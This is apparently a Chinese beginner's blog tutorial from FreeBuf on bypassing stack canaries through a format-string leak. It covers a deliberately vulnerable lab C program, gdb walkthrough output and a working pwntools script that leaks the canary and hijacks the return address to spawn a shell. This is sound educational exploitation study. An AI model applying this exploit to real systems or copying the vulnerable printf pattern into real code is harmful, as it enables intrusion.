@@ -1,0 +1,335 @@
+##  0x01 起
+
+ **（这只是一次小白的随笔记录，有些操作不太成熟，欢迎各位看官指出交流）**
+
+我们知道，缓冲区溢出漏洞利用的关键处就是溢出时，覆盖栈上保存的函数返回地址来达到攻击效果。于是就有人就设计出了很多保护机制：Canary、PIE、NX等。本文讨论的就是若程序只开启了canary保护机制，我们该怎么应对？该机制是在刚进入函数的时候，在栈底放一个标志位canary（又名金丝雀）：
+
+![](https://image.3001.net/images/20200413/1586791203_5e9483231e707.png!small)
+
+当缓冲区被溢出时，在返回地址被覆盖之前， canary会首先被覆盖。当函数结束时会检查这个栈上
+canary的值是否和存进去的值一致，就可以判断程序是否发生了溢出等攻击，紧接着程序将执行___stack_chk_fail函数，继而终止程序。
+
+(为了方式发生信息泄露以及其他漏洞的利用 canary使用\x00对值进行截断，即canary的最低字节为00)
+
+因此，我们绕过这种保护机制的方法，就是怎样使前后的canary判断正确。
+
+一般canary有两种利用方式
+
+1.爆破canary
+
+（大致了解了一下）
+
+![](https://image.3001.net/images/20200413/1586791245_5e94834d978db.png!small)
+
+2.如果程序存在字符串格式化溢出漏洞，我们就可以输出canary并利用溢出覆盖canary从而达到绕过。
+
+这里我们讲解第二种方式。
+
+##  0x02 承
+
+不过在讲解之前，我们先来学习一下格式化字符串漏洞？
+
+相信很多人都学过C语言吧！而C语言最普通的却必不可少的就是printf()函数了！也许大多数人以前几乎没有怎么关注过这个函数，那么今天就重新刷新对它的认知。
+
+printf在C语言中一般是这种写法：
+
+printf(“%d”,a); //输出数a的十进制格式
+
+其中双引号里面是a的输出格式要求，常见的还有：
+
+> %d - 十进制 - 输出十进制整数
+>
+> %s - 字符串 - 从内存中读取字符串
+>
+> %x - 十六进制 - 输出十六进制数
+>
+> %c - 字符 - 输出字符
+>
+> %p - 指针 - 指针地址
+>
+> %n - 到目前为止所写的字符数
+
+其中：
+
+![](https://image.3001.net/images/20200413/1586791284_5e94837456a8a.png!small)
+
+此外，我们更没有见过：
+
+例：
+
+%k$x表示访问第k个参数，并且把它以十六进制输出
+
+%k$d表示访问第k个参数，并且把它以十进制输出
+
+......
+
+平时的程序是这样：
+
+![](https://image.3001.net/images/20200413/1586791299_5e94838335265.png!small)但是如果程序员一不小心这样写呢？
+
+![](https://image.3001.net/images/20200413/1586791316_5e948394028b1.png!small)
+
+哈哈，似乎输出结果没什么区别！别急，因为你不知道的是：
+
+实际上，printf允许参数的个数并不固定，其中上面双引号为第一个参数：格式化字符串，后面的参数在实际运行时将与格式化字符串中特定格式的子字符串进行一一对应，将格式化字符串中的特定子串，解析为相应的参数值。
+
+此处我们只是单独地打印一个字符串hello_world，如果我们用户输入的是一个格式化字符format（如%s、%d、%k$x），那么printf就会读取栈上的“数据”，至于这个数据是什么？（我也不知道）请看后文：
+
+再来：
+
+![](https://image.3001.net/images/20200413/1586791371_5e9483cbac7db.png!small)![](https://image.3001.net/images/20200413/1586791383_5e9483d763a98.png!small)![](https://image.3001.net/images/20200413/1586791390_5e9483de89f37.png!small)
+
+此时：
+
+![](https://image.3001.net/images/20200413/1586791401_5e9483e9420f0.png!small)
+
+main+15处，我们往上翻翻：
+
+![](https://image.3001.net/images/20200413/1586791421_5e9483fd7f55c.png!small)
+
+而接下来的操作就是一直n操作到将printf参数入栈：
+
+![](https://image.3001.net/images/20200413/1586791449_5e9484198b7d4.png!small)
+
+即：
+
+汇编源码主体是：
+
+    
+    
+       0x8049189 <main+39>    push   2
+       0x804918b <main+41>    push   1
+       0x804918d <main+43>    lea    edx, [eax - 0x1ff3]
+       0x8049193 <main+49>    push   edx
+       0x8049194 <main+50>    mov    ebx, eax
+     ► 0x8049196 <main+52>    call   printf@plt <0x8049030>
+
+栈内容是：
+
+    
+    
+    00:0000│ esp   0xffffd260 —▸ 0x804a00d ◂— and    eax, 0x64252064 /* '%d %d %d %d %s' */
+    
+    01:0004│      0xffffd264 ◂— 0x1
+    
+    02:0008│      0xffffd268 ◂— 0x2
+    
+    03:000c│      0xffffd26c ◂— 0x3
+    
+    04:0010│      0xffffd270 ◂— 0x10
+    
+    05:0014│      0xffffd274 —▸ 0x804a008 ◂— je     0x804a06f /* 'test' */
+    
+    06:0018│      0xffffd278 —▸ 0xffffd33c —▸ 0xffffd4e9 ◂— 'SHELL=/bin/bash'
+    
+    07:001c│      0xffffd27c —▸ 0x8049176 (main+20) ◂— add    eax, 0x2e8a
+
+![](https://image.3001.net/images/20200413/1586791479_5e948437b4983.png!small)这个时候我们又对源文件做一点改变：
+
+![](https://image.3001.net/images/20200413/1586791493_5e948445123bd.png!small)
+
+重复以上步骤：
+
+gcc -m32 -z execstack -fno-stack-protector -no-pie -o test test.c
+
+![](https://image.3001.net/images/20200413/1586791514_5e94845a5d132.png!small)
+
+输入r：
+
+![](https://image.3001.net/images/20200413/1586791533_5e94846d9839e.png!small)
+
+上述C语言程序中，我们只给了五个参数：1,2,3,16,test,但是我们给的格式字符串有7个。于是，printf函数按照格式打印了七个数据,但是多出来-11460以及134517110不是我们输入的,而是保存在栈中的另外两个数据。通过这个特性,就有了格式化字符串漏洞。
+
+至此，格式化漏洞差不多讲明白了吧！
+
+补充：vc6.0++可能不支持这样格式溢出，如：
+
+![](https://image.3001.net/images/20200413/1586791551_5e94847f51919.png!small)但是在linux里面就可以打印出
+
+7th：70,4th：0040
+
+##  0x03 转
+
+现在我们正式进入今天的主题：
+
+待试验程序：
+
+![](https://image.3001.net/images/20200413/1586791687_5e94850751a6f.png!small)
+
+    
+    
+    #include<stdio.h>
+    void exploit()
+    {
+        system("/bin/sh");
+    }
+    void func()
+    {
+        char str[16];
+        read(0, str, 64);
+        printf(str);
+        read(0, str, 64);
+    }
+    int main()
+    {
+        func();
+        return 0;
+    }
+    
+    
+    gcc -no-pie -fstack-protector  -m32 -o 5.exe 5.c
+    checksec 5.exe
+
+![](https://image.3001.net/images/20200413/1586791723_5e94852bc346c.png!small)
+
+    
+    
+    gdb 5.exe 
+    i b
+    b func
+    i b
+    start
+
+![](https://image.3001.net/images/20200413/1586791738_5e94853ae0c50.png!small)
+
+然后一直输入n，直到遇见func函数：
+
+![](https://image.3001.net/images/20200413/1586791787_5e94856be4cc7.png!small)
+
+往上翻：
+
+![](https://image.3001.net/images/20200413/1586791800_5e9485784bde9.png!small)再n：
+
+![](https://image.3001.net/images/20200413/1586791822_5e94858e95469.png!small)
+
+看见上面重点没？这就是今天的一个关键！（gs是一个段寄存器）
+
+红框的意思是，从gs寄存器中取出一个4字节(eax)的值存到栈上。
+
+我们可以直接输入canary：
+
+![](https://image.3001.net/images/20200413/1586791838_5e94859e0110d.png!small)
+
+这个时候我第一眼观察的就是我们前面所提到的：
+
+canary设计是以“x00”结尾，本意就是为了保证canary可以截断字符串。泄露栈中canary的思路是覆盖canary的低字节，来打印出剩余的canary部分。
+
+堆栈中的canary：
+
+![](https://image.3001.net/images/20200413/1586791853_5e9485ad99760.png!small)继续n，直到read函数调用：
+
+![](https://image.3001.net/images/20200413/1586791867_5e9485bb02447.png!small)再次查看栈（这个时候栈显示不完整，输入stack
+20）：
+
+![](https://image.3001.net/images/20200413/1586791879_5e9485c79cecf.png!small)此时该canary所在位置离栈顶esp的偏移量为0x2c：
+
+![](https://image.3001.net/images/20200413/1586791891_5e9485d39b20e.png!small)
+
+即（4个字节一组）11组。这个11很重要！等会我们就要用printf函数输出这个位置的canary。
+
+往上翻：
+
+![](https://image.3001.net/images/20200413/1586791909_5e9485e5515f0.png!small)输入n：
+
+![](https://image.3001.net/images/20200413/1586791921_5e9485f1b0abd.png!small)此时程序运行要求我们输入
+
+![](https://image.3001.net/images/20200413/1586791933_5e9485fd868f6.png!small)
+
+这个时候我们就用上面所学的冷门格式化字符串%11$8x（代表输出）：
+
+![](https://image.3001.net/images/20200413/1586791948_5e94860c6568f.png!small)
+
+这个时候再n：
+
+![](https://image.3001.net/images/20200413/1586791969_5e94862188aa6.png!small)（由于上次时间问题，没有做完！今天继续做笔记。因为每次编译运行canary的值是随意分配的，所以以下canary的值在昨天同样的操作步骤下，已经变了，不过！不影响！）
+
+![](https://image.3001.net/images/20200413/1586791992_5e948638513f3.png!small)
+
+当函数结束时会检查这个栈上的值是否和存进去的值一致。
+
+这个时候我们继续n，就会遇到第2个read函数，要求我们输入：
+
+![](https://image.3001.net/images/20200413/1586792009_5e9486497eabb.png!small)
+
+（看了这么久，估计源程序已经忘了！）
+
+即：
+
+![](https://image.3001.net/images/20200413/1586792028_5e94865c635b5.png!small)
+
+经过上面的分析，我们已经知道第一个read函数的设置是为了打印出金丝雀的值，那么第二个read函数呢？
+
+第二个函数就是我们精心构造的payload了！此时的payload就要保证在溢出攻击getshell的同时，就需要利用我们已经得到的canary值了！那么怎么利用已经得到的canary的值来得到payload呢？
+
+这时我们可以使用python脚本进行第一次输入泄露canary后，在进行第二次输入的时候，在payload中将canary的位置填充成刚刚泄露出来的值即可。
+
+找出exploit函数的入口地址！同样作为payload的一部分来getshell：
+
+![](https://image.3001.net/images/20200413/1586792046_5e94866ec53ac.png!small)
+
+脚本python：
+
+![](https://image.3001.net/images/20200413/1586792065_5e94868156bee.png!small)
+
+    
+    
+    from pwn import *
+    p=process("./5.exe")
+    p.sendline("%11$08x")
+    canary=p.recv()[:8]
+    print(canary)
+     
+    canary=canary.decode("hex")[::-1]
+     
+    coffset=4*4
+    roffset=3*4
+    raddr=p32(0x8049192)
+    payload=coffset*'a'+canary+roffset*'a'+raddr
+    p.sendline(payload)
+    p.interactive()
+
+嗯！对于这段payload构造理解起来可能是本篇最困难的地方......
+
+先运行一下能否成功吧：
+
+![](https://image.3001.net/images/20200413/1586792096_5e9486a0e9c99.png!small)
+
+重新运行，我们可以看见canary的值又变了：a03dd300，并且成功getshell！
+
+那么我就根据payload来倒推怎么溢出？
+
+![](https://image.3001.net/images/20200413/1586792112_5e9486b063a63.png!small)
+
+回到刚刚我们的第二个read函数输入的地方：
+
+![](https://image.3001.net/images/20200413/1586792133_5e9486c5a61a8.png!small)![](https://image.3001.net/images/20200413/1586792139_5e9486cb3a9fa.png!small)
+
+连个椭圆形代表的就是填充的a：
+
+> coffset=4*4
+>
+> roffset=3*4
+
+至此！payload构造成功并getshell！
+
+##  0x04 合
+
+在两天的努力下，终于完稿了。期间遇到很多问题，但是带着问题去解决问题收到了不错的成效。综合简单利用格式化字符串漏洞来绕过程序的canary是平时经常遇到的问题，只有详细了解格式化字符串漏洞和canary保护机制的原理，并且多看多想多练，这样才能在再次遇到相似的情况下不至于茫然。最后真心感谢老师的悉心指导、同学的真诚帮助。
+
+ **参考链接：**
+
+>
+> <https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/>
+>
+> <https://bbs.pediy.com/thread-253638.htm>
+>
+> <https://www.jianshu.com/p/3d390a321cb8>
+>
+> <https://www.cnblogs.com/elvirangel/p/7191512.html>
+>
+> <https://bbs.pediy.com/thread-250858.htm>
+>
+> <https://www.anquanke.com/post/id/177832>
+
+***本文作者：wwwhxy，转载请注明来自FreeBuf.COM**
+
